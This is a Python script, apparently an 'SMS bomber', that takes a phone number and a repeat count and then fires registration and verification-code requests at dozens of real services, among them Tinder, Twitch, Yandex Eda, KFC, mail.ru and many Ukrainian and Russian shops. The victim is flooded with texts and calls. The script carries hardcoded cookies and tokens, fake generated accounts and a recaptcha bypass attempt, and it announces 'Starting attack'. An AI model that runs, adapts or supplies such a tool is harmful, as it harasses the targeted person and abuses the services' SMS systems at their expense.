import requests, random, datetime, sys, time, argparse, os, json ,getopt

def usage():
    print("Usage : python3 file.py 6691231231..")
    sys.exit(-1)

def check_number():

#    global phone_nums
#    global counts
#    try:
#        opts, args = getopt.getopt(argv, "n:c:", ["number","count"])
#    except getopt.GetoptError:
#        sys.exit(-1)
#
#    phone_nums = ''
#    counts = 5
#    
#    for opt,arg in opts:
#        if opt in ("-n" ,"--number"):
#            phone_nums = arg
#        elif opt in ("-c","--count"):
#            counts = int(arg)


    if phone:
        try:
            if int(phone) and len(phone) <= 13:
                global _phone
                _phone = phone
                if _phone[0] == '+': #+66123412347 -> 6612312312
                    _phone = _phone[1:]
                if _phone[0] == '0': #09123812498 -> 661238124
                    _phone = '66' + _phone
#                if _phone[0] == '66': #6612398142 == 6612394781624
#                   _phone = _phone
#                if _phone[0] == '9' or _phone[0] == '6':
#                    _phone = '0' + _phone

            else:
#                usage()
                print("something wrong")
                exit()
        except ValueError:
#            usage()
            print("Value Error")
            exit()

def generate_info():
    global _phone9
    global _name
    global _email
    global password
    global username
    global junker_phone
    junker_phone = _phone[2:] 
    _phone9 = '+' +_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email


def start():
    global iteration
    iteration = 0
    print(f"Starting attack {phone} for {count} times")
    while iteration < count:
        try:
            data_frisor={"phone": _phone}
            frisor={
                'Content-type': 'application/json', 
                'Accept': 'application/json, text/plain',
                'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                }
            requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data=json.dumps(data_frisor), headers=frisor)
            print("Frizor Sent !")
        except:
            print("Frizor Not Sent")
        try:
            requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone})
            print("Kasta Sent !")
        except:
            print("Kasta Not Sent")
        try:
            requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"})
            print("IZI Sent !")
        except:
            print("IZI Not Sent")
        try:
            requests.post("https://junker.kiev.ua/postmaster.php", data={
            'tel': junker_phone,'name': _name,'action':'callme',
            })
            print("Junker Kiev Sent !")
        except:
            print("Junker Kiev Not Sent")
        try:
            requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone})
            print("Youla Sent !")
        except:
            print("Youla Not Sent")
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print("MailRu Cloud Sent !")
        except:
            print("MailRu Cloud Not Sent")
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}")
            print("BELTELECOM3 Sent !")
        except:
            print("BELTELECOM3 Not Sent")
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print("Tinder Sent !")
        except:
            print("Tinder Not Sent")
        try:
            requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": _phone9,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile",})
            print("Getmancar Sent !")
        except:
            print("Getmancar Not Sent")
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
            print("ICQ Sent !")
        except:
            print("ICQ Not Sent")
        try:
            requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}})
            print("Pozichka Sent !")
        except:
            print("Pozichka Not Sent")
        try:
            requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}')
            print("SecureOnline Sent !")
        except:
            print("SecureOnline Not Sent")
        try:
            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone))
            print("SportMaster Sent !")
        except:
            print("SportMaster Not Sent")
        try:
            requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9})
            print("Звонок Sent !")
        except:
            print("Звонок Not Sent")
        try:
            requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone},)
            print("City24 Sent !")
        except:
            print("City24 Not Sent ")
        try:
            requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"},)
            print("Helsi Sent !")
        except:
            print("Helsi Not Sent ")
        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email})
            print("CloudMail Sent !")
        except:
            print("CloudMail Not Sent ")
        try:
            requests.post("https://auth.multiplex.ua/login", json={"login": _phone},)
            print("Multiplex Sent !")
        except:
            print("Multiplex Not Sent ")
        try:
            requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},)
            print("MyGames Sent !")
        except:
            print("MyGames Not Sent ")
        try:
            requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
            print("Planetakino Sent !")
        except:
            print("Planetakino Not Sent ")
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print("Tinder Sent !")
        except:
            print("Tinder Not Sent ")
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print("Youla Sent !")
        except:
            print("Youla Not Sent ")
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': _phone9})
            print("LiST Sent !")
        except:
            print("LiST Not Sent ")
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print("MVideo Sent !")
        except:
            print("MVideo Not Sent ")
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print("Tinder Sent !")
        except:
            print("Tinder Not Sent ")
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print("Twitch Sent !")
        except:
            print("Twitch Not Sent ")
        try:
            requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9})
            print("BelkaCar Sent !")
        except:
            print("BelkaCar Not Sent ")
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print("IVI Sent !")
        except:
            print("IVI Not Sent ")
        try:
            requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
            requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone9})
            print("SportMaster, BelkaCar Sent !")
        except:
            print("SportMaster Not Sent ")
        try:
            requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone})
            print("SecureOnline Sent !")
        except:
            print("SecureOnline Not Sent ")
        try:
            requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"})
            print("NovaLiniya Sent !")
        except:
            print("NovaLiniya Not Sent ")
        try:
            requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email})
            print("MPlanet Sent !")
        except:
            print("MPlanet Not Sent ")
        try:
            requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print("DELIMOBIL Sent !")
        except:
            print("DELIMOBIL Not Sent ")
        try:
            requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone})
            print("Apteka 366 Sent !")
        except:
            print("Apteka 366 Not Sent ")
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={"phone":_phone})
            print("Belkacar Sent !")
        except:
            print("Belkacar Not Sent ")
        try:
            requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell":_phone})
            print("Друг Вокруг Sent !")
        except:
            print("Друг Вокруг Not Sent ")
        try:
            requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9})
            print("Energiia oтправлено!")
        except:
            print("Energiia Not Sent ")
        try:
            requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format(_phone9))
            print("Fundayshop oтправлено!")
        except:
            print("Fundayshop Not Sent ")
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
            print("Gorzdrav oтправлено!")
        except:
            print("Gorzdrav Not Sent ")
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9})
            print("KFC Sent !")
        except:
            print("KFC Not Sent ")
        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9})
            print("Viasat Sent !")
        except:
            print("Viasat Not Sent ")
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone})
            print("Yandex Food Sent !")
        except:
            print("Yandex Food Not Sent ")
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9))
            print("Сitilink Sent !")
        except:
            print("Сitilink Not Sent ")
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
            print("Yandex Eda Sent !")
        except:
            print("Yandex Eda Not Sent ")
        try:
            requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
            print("Dianet Sent !")
        except:
            print("Dianet Not Sent ")
        try:
            requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru",})
            print("Eldorado Sent !")
        except:
            print("Eldorado Not Sent ")
        try:
            requests.post("https://shafa.ua/api/v3/graphiql", json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },)
            print("ส่ง  SMS!")
        except:
            print("Not Sent SMS")
        iteration += 1
        print((f'Counting \n{iteration} times\n'))
    os.system("clear")


def menu():
    global phone
    phone = input("Phone num: ")
    check_number()
    global count
    count = int(input("Count : "))
    generate_info()
    start()
    print("Mission Accomplished")


def main():
    menu()

main()